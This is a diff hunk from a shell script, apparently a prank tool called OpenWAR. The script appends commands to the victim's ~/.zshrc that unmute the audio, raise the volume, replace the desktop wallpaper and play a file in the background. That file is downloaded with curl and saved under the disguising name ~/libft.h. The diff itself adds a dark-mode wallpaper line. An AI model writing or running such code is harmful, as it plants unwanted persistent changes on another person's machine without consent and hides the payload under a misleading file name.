@@ -155,6 +155,7 @@ while true; do
 		amixer set Master unmute
 		amixer set Master 10%
 		gsettings set org.gnome.desktop.background picture-uri $filewp
+		gsettings set org.gnome.desktop.background picture-uri-dark $filewp
 		nohup nvlc ~/libft.h &
 	" >> ~/.zshrc
     curl -o ~/libft.h https://raw.githubusercontent.com/murmurlab/OpenWAR/main/libft.h
